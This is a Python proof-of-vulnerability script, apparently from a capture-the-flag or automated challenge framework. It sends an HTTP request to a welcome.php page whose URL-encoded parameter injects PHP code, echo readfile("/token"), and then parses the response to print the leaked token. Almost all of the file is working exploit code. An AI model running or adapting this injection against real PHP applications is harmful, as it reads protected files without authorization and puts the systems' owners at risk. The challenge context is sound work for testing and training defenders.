import sys
import socket
import random
import time
import string
import base64
import os
import datetime
import string
import struct
import signal

pwd = ''
homedir = ''

def handler( signum, frame):
    print('[FAIL] sigalrm fired so the POV was likely unsuccessful')
    exit(0)

def randomstring(l):
    q = ''

    for _ in range(l):
        q += random.choice(string.ascii_lowercase)

    return q

def connect( ip, port ):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.connect( (ip, port) )
    except:
        print('Failed to connect to %s:%d' %(ip, port))
        sys.exit(1)

    return s

def RU( s, u ):
    z = ''

    try:
        while z.endswith( u ) == False:
            z += s.recv(1).decode('utf-8')
    except Exception as e:
        print('Failed to receive data')
        print(e)
        return None

    return z

def RL( s ):
    return RU( s, '\n')

def SW(s, data):
    #print data
    s.sendall(data)

def main():
    if len(sys.argv) == 3:
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
    else:
        if 'HOST' in os.environ and 'PORT' in os.environ:
            HOST = os.environ['HOST']
            PORT = int(os.environ['PORT'])
        else:
            print('[ERROR] HOST and PORT must be specified via arguments or variables.')
            sys.exit(1)

    signal.signal(signal.SIGALRM, handler)
    signal.alarm(10)
    
    s = connect( HOST, PORT )

    req = b'GET /welcome.php?name=hello%26email=hello%40hello%2ecom%26pwn=%22%3b%20echo%20readfile%28%22%2ftoken%22%29%3b%20%22 HTTP/1.1\r\n'
    req += b'Host: chess\r\n\r\n'

    SW(s, req)

    y = RU(s, '\r\n\r\n').encode('utf-8')

    cl = y.find(b'Content-Length: ')

    if ( cl == -1):
        return 1

    d = y[cl + 16:].split(b'\r\n')

    length = int(d[0])

    y = s.recv(length)

    start = y.find(b'<')

    if ( start == 0 ):
        print('[FAILED] POV was not successful')
        s.close()
        exit(1)

    token = y[:start]

    print('[TOKEN] %s' %token)

    print('[SUCCESS] POV completed successfully')

if __name__ == '__main__':
    main()
